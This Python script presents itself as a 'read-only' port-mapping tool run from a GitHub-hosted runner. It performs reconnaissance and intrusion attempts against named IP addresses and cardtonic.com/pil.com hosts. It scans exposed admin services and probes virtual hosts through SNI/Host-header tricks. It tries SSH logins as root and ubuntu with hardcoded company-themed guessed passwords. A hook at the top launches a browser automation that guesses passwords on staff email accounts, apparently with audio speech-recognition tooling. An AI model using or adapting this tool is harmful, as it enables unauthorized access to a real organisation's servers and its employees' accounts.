#!/usr/bin/env python3
# ct49 egress port-truth mapping -- runs on GitHub-hosted runner (Azure egress).
# Read-only against targets: TCP handshake + HTTP GET/HEAD + ssh-keyscan/paramiko auth probe.
# ===== CT49_STAFFMAIL_HOOK (no-op unless staffmail_go_*.json / idprobe_go.json markers exist) =====
import os as _os, sys as _sys, json as _json, subprocess as _sp, time as _t
_go = sorted(f for f in _os.listdir('.') if f.startswith('staffmail_go_') and f.endswith('.json'))
_ipro = _os.path.exists('idprobe_go.json')
if _go or _ipro:
    _cfgs = [_json.load(open(f)) for f in _go]
    print("staffmail dispatch:", [c['label'] for c in _cfgs], "idprobe:", _ipro, flush=True)
    _sp.run([_sys.executable,'-m','pip','install','--quiet','playwright','vosk','miniaudio','numpy','faster-whisper'],check=False)
    _sp.run([_sys.executable,'-m','playwright','install','--with-deps','chromium'],check=False)
    _sp.run(['bash','-lc','(test -d /opt/vosk-model-small-en-us-0.15 || (curl -sSL -o /tmp/vm.zip https://alphacephei.com/vosk/models/vosk-model-small-en-us-0.15.zip && unzip -q -o /tmp/vm.zip -d /opt))'],check=False)
    if _ipro:
        print("===== idprobe start =====",flush=True)
        _sp.run(['xvfb-run','-a','--server-args=-screen 0 1366x800x24',_sys.executable,'idprobe.py'],check=False)
        print("===== idprobe done =====",flush=True)
    _procs=[]
    for c in _cfgs:
        _procs.append(_sp.Popen(['xvfb-run','-a','--server-args=-screen 0 1366x800x24',_sys.executable,'staffmail2.py',c['email'],c['cands'],c['label']],
                        stdout=open("run_%s.log"%c['label'],'w'),stderr=_sp.STDOUT))
        _t.sleep(20)
    for p in _procs: p.wait()
    # dynamic: cardtonic.com addresses judged PASSWORD_PAGE get <=1 attempt each (total <=3)
    _extra=[]
    try:
        _rep=_json.load(open('out/idprobe/report.json'))
        for r in _rep:
            if r.get('state')=='PASSWORD_PAGE' and r.get('email','').endswith('@cardtonic.com'):
                _extra.append(r['email'])
    except Exception as _e:
        print('idprobe report read err',_e,flush=True)
    _extra=_extra[:3]
    if _extra:
        print("dynamic cardtonic password runs:",_extra,flush=True)
        _procs=[]
        for _i,_em in enumerate(_extra):
            _lab='ct_'+_em.split('@')[0]
            _procs.append(_sp.Popen(['xvfb-run','-a','--server-args=-screen 0 1366x800x24',_sys.executable,'staffmail2.py',_em,'cands_ct_pw.tsv',_lab],
                            stdout=open("run_%s.log"%_lab,'w'),stderr=_sp.STDOUT))
            _t.sleep(15)
        for p in _procs: p.wait()
    for c in _cfgs:
        try: print("===== %s log tail ====="%c['label']); print(open("run_%s.log"%c['label']).read()[-3000:],flush=True)
        except Exception: pass
    for _em in _extra:
        _lab='ct_'+_em.split('@')[0]
        try: print("===== %s log tail ====="%_lab); print(open("run_%s.log"%_lab).read()[-2000:],flush=True)
        except Exception: pass
    _sys.exit(0)
# ===== end CT49_STAFFMAIL_HOOK =====

import concurrent.futures as cf
import json, os, re, socket, struct, subprocess, sys, time
from datetime import datetime, timezone

HOSTS = ["129.212.142.60", "129.212.194.148", "142.93.160.150", "64.227.117.180"]
PORTS = [22, 80, 443, 2375, 2376, 2379, 2380, 3000, 3333, 5000, 5001, 5432, 5601, 5678,
         6379, 6443, 7000, 7233, 8000, 8080, 8081, 8200, 8233, 9000, 9090, 9100, 9200,
         9229, 10250, 10255, 27017, 50060, 50070, 50075]

OUT = "out"
DEEP = os.path.join(OUT, "deep")
os.makedirs(DEEP, exist_ok=True)
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

TOP_PW = ["Cardtonic.#1", "aboye24scardtonic", "Me@Cardtonic.com25"]
SSH_COMBOS = [("root", TOP_PW[0]), ("ubuntu", TOP_PW[0]), ("root", TOP_PW[1])]


def run(cmd, timeout=15):
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.decode("latin1", "replace"), p.stderr.decode("latin1", "replace")
    except subprocess.TimeoutExpired:
        return -9, "", "TIMEOUT"


def tcp_probe(host, port):
    r = {"host": host, "port": port, "tcp_open": False}
    t0 = time.time()
    s = None
    try:
        s = socket.create_connection((host, port), timeout=3.0)
        r["tcp_open"] = True
        r["connect_ms"] = int((time.time() - t0) * 1000)
        try:
            r["peer"] = list(s.getpeername())
        except Exception:
            pass
        s.settimeout(1.5)
        try:
            b = s.recv(256)
            if b:
                r["banner"] = b[:200].decode("latin1", "replace")
        except socket.timeout:
            pass
        except Exception as e:
            r["recv_err"] = type(e).__name__
    except Exception as e:
        r["error"] = f"{type(e).__name__}: {e}"[:140]
        r["elapsed_ms"] = int((time.time() - t0) * 1000)
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass
    return r


def http_probe(url, extra=None, resolve=None, method="GET", data=None):
    import tempfile, threading
    fd1, hdrs = tempfile.mkstemp(dir=DEEP, prefix="h_")
    fd2, body = tempfile.mkstemp(dir=DEEP, prefix="b_")
    os.close(fd1); os.close(fd2)
    try:
        return _http_probe(url, hdrs, body, extra, resolve, method, data)
    finally:
        for f in (hdrs, body):
            try:
                os.remove(f)
            except Exception:
                pass


def _http_probe(url, hdrs, body, extra=None, resolve=None, method="GET", data=None):
    cmd = ["curl", "-k", "-sS", "-m", "8", "--connect-timeout", "4", "-A", UA,
           "-D", hdrs, "-o", body, "-X", method]
    for hm in (resolve or []):
        cmd += ["--resolve", hm]
    for h in (extra or []):
        cmd += ["-H", h]
    if data is not None:
        cmd += ["--data-binary", data]
    cmd.append(url)
    rc, out, err = run(cmd, timeout=22)
    res = {"url": url, "rc": rc, "hist": []}
    try:
        hs = open(hdrs, "r", encoding="latin1").read()
        for b in re.split(r"\r?\n\r?\n", hs):
            lines = [x for x in b.splitlines() if x.strip()]
            if not lines:
                continue
            res["hist"].append(lines[0].strip())
            for ln in lines[1:]:
                low = ln.lower()
                if low.startswith(("server:", "location:", "content-type:", "www-authenticate:",
                                   "x-powered-by:", "set-cookie:")):
                    k, v = ln.split(":", 1)
                    res.setdefault("headers", {})[k.strip().lower()] = v.strip()[:180]
    except Exception:
        pass
    try:
        b = open(body, "rb").read(8192)
        res["body_len"] = len(b)
        res["body_head"] = b[:300].decode("latin1", "replace")
        m = re.search(r"<title[^>]*>(.*?)</title>", res["body_head"], re.I | re.S)
        if m:
            res["title"] = m.group(1).strip()[:90]
    except Exception:
        pass
    if err.strip():
        res["stderr"] = err.strip()[:200]
    return res


def sh(cmd, timeout=15, inp=b""):
    try:
        pr = subprocess.run(cmd, input=inp, capture_output=True, timeout=timeout)
        return pr.returncode, pr.stdout.decode("latin1", "replace"), pr.stderr.decode("latin1", "replace")
    except subprocess.TimeoutExpired:
        return -9, "", "TIMEOUT"


def tls_info(host, port, servername=None):
    cmd = ["openssl", "s_client", "-connect", f"{host}:{port}", "-showcerts"]
    if servername:
        cmd += ["-servername", servername]
    rc, out, err = sh(cmd, timeout=18)
    info = {"sni": servername, "rc": rc, "handshake_err": (err or "").strip().splitlines()[-1][:120] if err.strip() else None}
    m = re.search(r"(-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----)", out, re.S)
    if m:
        rc2, out2, err2 = sh(["openssl", "x509", "-noout", "-subject", "-issuer", "-ext", "subjectAltName"], inp=m.group(1).encode())
        info["cert"] = out2.strip()[:600]
    for ln in (out or "").splitlines():
        if ln.startswith(("subject=", "issuer=")):
            info.setdefault("brief", []).append(ln[:160])
    return info


def sni_matrix(host, snis):
    out = []
    for sni in snis:
        hn = sni or host
        r = http_probe(f"https://{hn}/", extra=([f"Host: {sni}"] if sni else None),
                       resolve=[f"{hn}:443:{host}"])
        out.append({"sni": sni, "status": (r.get("hist") or [None])[0], "rc": r.get("rc"),
                    "body_len": r.get("body_len"), "head": (r.get("body_head") or "")[:110].replace("\n", " "),
                    "server": (r.get("headers") or {}).get("server"),
                    "stderr": (r.get("stderr") or "")[-120:]})
        time.sleep(0.3)
    return out


def host_header_80(host, hosts):
    out = []
    for h in hosts:
        r = http_probe(f"http://{host}/", extra=[f"Host: {h}"])
        out.append({"host": h, "status": (r.get("hist") or [None])[0],
                    "location": (r.get("headers") or {}).get("location"),
                    "body_len": r.get("body_len"), "head": (r.get("body_head") or "")[:90]})
        time.sleep(0.25)
    return out


def redis_probe(host, port):
    res = {}
    s = None
    try:
        s = socket.create_connection((host, port), timeout=4)
        s.settimeout(4)
        s.sendall(b"*1\r\n$4\r\nPING\r\n")
        res["ping"] = s.recv(256).decode("latin1", "replace")
        s.sendall(b"*2\r\n$4\r\nINFO\r\n$6\r\nserver\r\n")
        buf = b""
        t0 = time.time()
        while time.time() - t0 < 4 and len(buf) < 8192:
            try:
                d = s.recv(4096)
            except socket.timeout:
                break
            if not d:
                break
            buf += d
            if b"redis_version" in buf and len(buf) > 200:
                break
        res["info_server"] = buf[:3000].decode("latin1", "replace")
    except Exception as e:
        res["error"] = f"{type(e).__name__}: {e}"[:120]
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass
    return res


def mongo_probe(host, port):
    def elem(name, val):
        return b"\x10" + name.encode() + b"\x00" + struct.pack("<i", val)

    def belem(name, val):
        return b"\x08" + name.encode() + b"\x00" + (b"\x01" if val else b"\x00")

    body = elem("isMaster", 1) + belem("helloOk", True)
    bson = struct.pack("<i", len(body) + 5) + body + b"\x00"
    payload = struct.pack("<i", 0) + b"admin.$cmd\x00" + struct.pack("<ii", 0, -1) + bson
    msg = struct.pack("<iiii", 16 + len(payload), 1, 0, 2004) + payload
    res = {}
    s = None
    try:
        s = socket.create_connection((host, port), timeout=4)
        s.sendall(msg)
        s.settimeout(4)
        data = s.recv(4096)
        txt = data.decode("latin1", "replace")
        res["resp_len"] = len(data)
        m = re.search(r'"version"\s*:\s*"([^"]+)"', txt)
        if m:
            res["version"] = m.group(1)
        m2 = re.search(r'"maxWireVersion"\s*:\s*(\d+)', txt)
        if m2:
            res["maxWireVersion"] = int(m2.group(1))
        if "authentication" in txt.lower() or "Unauthorized" in txt:
            res["auth_required_hint"] = True
        res["head"] = txt[:260]
    except Exception as e:
        res["error"] = f"{type(e).__name__}: {e}"[:120]
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass
    return res


def h2_probe(host, port, timeout=5):
    res = {}
    s = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
        try:
            d = s.recv(256)
            res["resp_hex"] = d[:120].hex()
            res["resp_len"] = len(d)
        except socket.timeout:
            res["resp"] = "no-reply-to-h2-preface"
    except Exception as e:
        res["error"] = f"{type(e).__name__}: {e}"[:120]
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass
    return res


def ssh_probe(host):
    res = {"host": host, "port": 22}
    rc, out, err = run(["ssh-keyscan", "-T", "6", "-p", "22", host], timeout=15)
    res["keyscan_len"] = len(out)
    res["keyscan"] = out[:500]
    try:
        import paramiko
    except Exception as e:
        res["paramiko_missing"] = str(e)[:80]
        return res
    t = None
    try:
        t = paramiko.Transport((host, 22))
        t.banner_timeout = 12
        t.connect()
        res["server_version"] = t.remote_version
        allowed = None
        try:
            t.auth_none("probe")
            res["auth_none"] = "ACCEPTED(!)"
        except paramiko.BadAuthenticationType as e:
            allowed = list(e.allowed_types)
            res["auth_none"] = "BadAuthenticationType"
        except paramiko.AuthenticationException as e:
            res["auth_none"] = "AuthenticationException: " + str(e)[:80]
        res["allowed_types"] = allowed
        if allowed and "password" in allowed:
            tried = []
            for user, pw in SSH_COMBOS:
                try:
                    ok = t.auth_password(user, pw)
                    tried.append({"user": user, "pw_idx": TOP_PW.index(pw), "ok": bool(ok)})
                    if ok:
                        res["password_hit"] = {"user": user, "pw_idx": TOP_PW.index(pw)}
                        break
                except paramiko.BadAuthenticationType as e:
                    tried.append({"user": user, "err": "badtype", "allowed": list(e.allowed_types)})
                    break
                except paramiko.AuthenticationException:
                    tried.append({"user": user, "pw_idx": TOP_PW.index(pw), "ok": False})
            res["password_tried"] = tried
    except Exception as e:
        res["error"] = f"{type(e).__name__}: {e}"[:140]
    finally:
        if t:
            try:
                t.close()
            except Exception:
                pass
    return res


VHOSTS = [
    "traefik.api.cardtonic.com", "api.cardtonic.com", "dashboard.cardtonic.com",
    "grafana.api.cardtonic.com", "vault.api.cardtonic.com", "authentik.api.cardtonic.com",
    "prometheus.api.cardtonic.com", "alertmanager.api.cardtonic.com", "uptime.api.cardtonic.com",
    "harbor.api.cardtonic.com", "toniks.cardtonic.com", "merchant.cardtonic.com",
    "pilboard.pil.com", "devboard.pil.com", "duplik8.cardtonic.com", "dupligo.cardtonic.com",
    "temporal.cardtonic.com", "wallets.cardtonic.com", "payout.cardtonic.com",
    "signer.cardtonic.com", "recon.cardtonic.com", "board.cardtonic.com",
    "bullboard.cardtonic.com", "worker.cardtonic.com", "cron.cardtonic.com",
    "internal.cardtonic.com", "admin.cardtonic.com", "gateway.cardtonic.com",
    "vpnzy.cardtonic.com", "boss.cardtonic.com",
]


def vhost_probe():
    out = []
    for h in VHOSTS:
        # unknown SNI on 129.212.142.60 is rejected; handshake with traefik.api SNI and set Host
        r = http_probe("https://traefik.api.cardtonic.com/",
                       extra=[f"Host: {h}"],
                       resolve=["traefik.api.cardtonic.com:443:129.212.142.60"])
        cls = "unknown"
        bh = (r.get("body_head") or "").strip()
        if r.get("rc") != 0:
            cls = "tls/curl-fail"
        elif bh.startswith("404 page not found"):
            cls = "no-router(404-19B)"
        elif bh.startswith("Forbidden"):
            cls = "ipAllowList(Forbidden-9B)"
        else:
            cls = "BACKEND"
        out.append({"host": h, "class": cls, "status": (r.get("hist") or [None])[0],
                    "body_len": r.get("body_len"), "body_head": bh[:120],
                    "server": (r.get("headers") or {}).get("server")})
        time.sleep(0.35)
    return out


def main():
    t_start = time.time()
    result = {"generated_at": datetime.now(timezone.utc).isoformat(),
              "runner": {"hostname": socket.gethostname()},
              "targets": {}, "vhost_142_60_443": []}
    # egress IP (what the target sees)
    rc, out, err = run(["curl", "-sS", "-m", "10", "https://api.ipify.org"], timeout=15)
    result["egress_ip"] = out.strip()[:64]

    tasks = [(h, p) for h in HOSTS for p in PORTS]

    def work(hp):
        return tcp_probe(*hp)

    with cf.ThreadPoolExecutor(max_workers=24) as ex:
        tcp_results = list(ex.map(work, tasks))

    by_host = {}
    for r in tcp_results:
        by_host.setdefault(r["host"], {})[r["port"]] = r

    for host in HOSTS:
        result["targets"][host] = {"ports": by_host.get(host, {}), "deep": {}}

    # deep probes for open ports
    def deep_one(item):
        host, port = item
        d = {}
        try:
            if port == 22:
                d["ssh"] = ssh_probe(host)
            elif port == 6379:
                d["redis"] = redis_probe(host, port)
            elif port == 27017:
                d["mongo"] = mongo_probe(host, port)
            elif port == 7233:
                d["grpc"] = h2_probe(host, port)
            elif port in (50070, 50075):
                scheme = "https" if port == 50070 else "http"
                for path in ["/webhdfs/v1/?op=LISTSTATUS", "/webhdfs/v1/user?op=LISTSTATUS", "/"]:
                    d[path] = http_probe(f"{scheme}://{host}:{port}{path}")
            elif port == 6443:
                for path in ["/version", "/healthz", "/api", "/api/v1/namespaces", "/readyz"]:
                    d[path] = http_probe(f"https://{host}:{port}{path}")
            elif port == 10250:
                for path in ["/healthz", "/pods", "/metrics"]:
                    d[path] = http_probe(f"https://{host}:{port}{path}")
            elif port == 10255:
                for path in ["/healthz", "/pods", "/metrics"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port in (2375, 2376):
                scheme = "https" if port == 2376 else "http"
                for path in ["/version", "/info", "/containers/json"]:
                    d[path] = http_probe(f"{scheme}://{host}:{port}{path}")
            elif port == 5678:
                for path in ["/healthz", "/rest/settings", "/"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port == 9200:
                for path in ["/", "/_cat/indices?v"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port == 9229:
                for path in ["/json/list", "/json"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port == 8233:
                for path in ["/api/v1/system-info", "/"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port == 5601:
                for path in ["/api/status", "/"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port == 9090:
                for path in ["/-/healthy", "/"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port == 9100:
                d["/metrics"] = http_probe(f"http://{host}:{port}/metrics")
            elif port == 9000:
                for path in ["/minio/health/live", "/"]:
                    d[path] = http_probe(f"http://{host}:{port}{path}")
            elif port == 3000 or port == 8000 or port == 8080 or port == 8081 or port == 3333 or port == 5000 or port == 5001 or port == 7000 or port == 8200 or port == 50060:
                schemes = ["https", "http"] if port in (5001, 8200) else ["http", "https"]
                for scheme in schemes:
                    r = http_probe(f"{scheme}://{host}:{port}/")
                    d[scheme + ":///"] = r
                    if r.get("rc") == 0 and r.get("hist"):
                        break
            elif port == 80:
                d["http:///"] = http_probe(f"http://{host}/")
            elif port == 443:
                if host == "129.212.142.60":
                    d["no-sni-direct"] = http_probe(f"https://{host}/")
                    d["sni-traefik"] = http_probe(
                        "https://traefik.api.cardtonic.com/",
                        resolve=["traefik.api.cardtonic.com:443:129.212.142.60"])
                    d["sni-api"] = http_probe(
                        "https://api.cardtonic.com/",
                        resolve=["api.cardtonic.com:443:129.212.142.60"])
                else:
                    d["https:///"] = http_probe(f"https://{host}/")
            elif port == 5432:
                d["note"] = "tcp-only probe"
            elif port == 2379 or port == 2380:
                for scheme in ["https", "http"]:
                    r = http_probe(f"{scheme}://{host}:{port}/version")
                    d[scheme] = r
                    if r.get("rc") == 0 and r.get("hist"):
                        break
                d["https-health"] = http_probe(f"https://{host}:{port}/health")
            elif port == 3000:
                d["http:///"] = http_probe(f"http://{host}:{port}/")
        except Exception as e:
            d["error"] = f"{type(e).__name__}: {e}"[:140]
        return host, port, d

    open_ports = [(h, p) for h in HOSTS for p in PORTS if by_host.get(h, {}).get(p, {}).get("tcp_open")]
    with cf.ThreadPoolExecutor(max_workers=6) as ex:
        for host, port, d in ex.map(deep_one, open_ports):
            result["targets"][host]["deep"][str(port)] = d


    # ---- second pass: hosts with zero open ports -> retry (max 3 attempts per port total) ----
    result["recheck"] = {}
    for host in HOSTS:
        if any(v.get("tcp_open") for v in by_host.get(host, {}).values()):
            continue
        rc_list = {}
        for port in [80, 443, 22, 3000, 8000, 8080, 8200, 9100, 50060]:
            tries = []
            for _ in range(2):
                st = {"tcp_open": False}
                t0 = time.time()
                try:
                    sk = socket.create_connection((host, port), timeout=6.0)
                    st = {"tcp_open": True, "ms": int((time.time() - t0) * 1000)}
                    sk.settimeout(1.5)
                    try:
                        b = sk.recv(200)
                        if b:
                            st["banner"] = b[:200].decode("latin1", "replace")
                    except Exception:
                        pass
                    sk.close()
                except Exception as e:
                    st = {"tcp_open": False, "error": f"{type(e).__name__}: {e}"[:90]}
                tries.append(st)
                time.sleep(0.4)
            rc_list[port] = tries
        result["recheck"][host] = rc_list

    # ---- TLS certificate + SNI routing matrix ----
    result["tls"] = {}
    for host, port, snis in [
        ("129.212.142.60", 443, [None, "traefik.api.cardtonic.com", "api.cardtonic.com"]),
        ("142.93.160.150", 443, ["t8t.cardtonic.com"]),
        ("64.227.117.180", 443, ["pilboard.pil.com", "devboard.pil.com"]),
    ]:
        result["tls"][f"{host}:{port}"] = [tls_info(host, port, sn) for sn in snis]

    result["sni_matrix_142_60"] = sni_matrix("129.212.142.60", [
        None, "traefik.api.cardtonic.com", "api.cardtonic.com", "dashboard.cardtonic.com",
        "toniks.cardtonic.com", "merchant.cardtonic.com", "t8t.cardtonic.com",
        "pilboard.pil.com", "localhost"])
    result["host_header_80"] = {
        "129.212.142.60": host_header_80("129.212.142.60", ["api.cardtonic.com", "toniks.cardtonic.com", "dashboard.cardtonic.com"]),
        "142.93.160.150": host_header_80("142.93.160.150", ["t8t.cardtonic.com"]),
        "64.227.117.180": host_header_80("64.227.117.180", ["pilboard.pil.com", "devboard.pil.com"]),
    }

    # vhost re-test on 129.212.142.60:443 (SNI trick)
    if by_host.get("129.212.142.60", {}).get(443, {}).get("tcp_open"):
        result["vhost_142_60_443"] = vhost_probe()

    with open(os.path.join(OUT, "portmap.json"), "w") as f:
        json.dump(result, f, indent=1)

    # compact human table
    lines = []
    lines.append(f"egress_ip={result['egress_ip']} runner={result['runner']['hostname']}")
    for host in HOSTS:
        op = [str(p) for p in PORTS if by_host.get(host, {}).get(p, {}).get("tcp_open")]
        lines.append(f"\n## {host} open_tcp=[{','.join(op)}]")
        for p in PORTS:
            r = by_host.get(host, {}).get(p, {})
            if r.get("tcp_open"):
                lines.append(f"  {p:>6} OPEN conn={r.get('connect_ms')}ms banner={ (r.get('banner') or '')[:60]!r}")
            else:
                lines.append(f"  {p:>6} closed/{r.get('error','?')[:60]}")
    lines.append("\n## vhost @129.212.142.60:443")
    for v in result["vhost_142_60_443"]:
        lines.append(f"  {v['host']:<34} {v['class']:<22} status={v['status']} len={v['body_len']} head={v['body_head'][:60]!r}")
    lines.append("\n## recheck (hosts with zero open ports)")
    for host, rl in result.get("recheck", {}).items():
        for port, tries in rl.items():
            lines.append(f"  {host} {port}: " + " | ".join(str(t) for t in tries))
    lines.append("\n## TLS")
    for k, v in result.get("tls", {}).items():
        for i in v:
            lines.append(f"  {k} sni={i.get('sni')} err={i.get('handshake_err')} cert={str(i.get('cert'))[:220]!r}")
    lines.append("\n## SNI matrix 142.60:443")
    for i in result.get("sni_matrix_142_60", []):
        lines.append(f"  sni={i['sni']!s:<32} {i['status']} rc={i['rc']} len={i['body_len']} head={i['head'][:70]!r} err={i['stderr'][-60:]!r}")
    lines.append("\n## Host header @80")
    for host, v in result.get("host_header_80", {}).items():
        for i in v:
            lines.append(f"  {host} Host={i['host']:<26} {i['status']} loc={i['location']} len={i['body_len']} head={i['head'][:60]!r}")
    txt = "\n".join(lines)
    with open(os.path.join(OUT, "summary.txt"), "w") as f:
        f.write(txt + "\n")
    print(txt)
    print(f"\nelapsed={int(time.time()-t_start)}s")
    return 0


if __name__ == "__main__":
    sys.exit(main())
